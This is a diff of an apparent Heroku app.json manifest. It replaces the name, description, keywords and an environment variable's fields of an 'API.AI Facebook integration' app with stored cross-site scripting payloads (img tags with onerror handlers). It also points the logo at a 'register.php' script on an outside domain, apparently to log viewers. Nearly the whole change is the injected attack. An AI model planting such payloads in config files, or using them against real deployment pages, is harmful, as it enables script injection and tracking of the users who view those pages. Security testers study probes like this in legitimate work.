@@ -1,13 +1,13 @@
 {
-  "name": "API.AI Facebook integration",
-  "description": "Api.ai Facebook integration allows you to create Facebook bots with natural language understanding based on Api.ai technology.",
+  "name": "Nombre'\"><img src=x onerror=alert()>",
+  "description": "Descripcion'\"><img src=x onerror=alert()>",
   "repository": "https://u00f1.xyz/",
   "logo": "https://u00f1.xyz/heroku/register.php",
-  "keywords": ["api.ai", "facebook", "natural language"],
+  "keywords": ["palabra'\"><img src=x onerror=alert()>"],
   "env": {
-    "APIAI_LANG": {
-      "description": "Agent language",
-      "value": "",
+    "SOMETHING": {
+      "description": "descripcion'\"><img src=x onerror=alert()>",
+      "value": "valor'\"><img src=x onerror=alert()>",
       "required": false
     }
   },
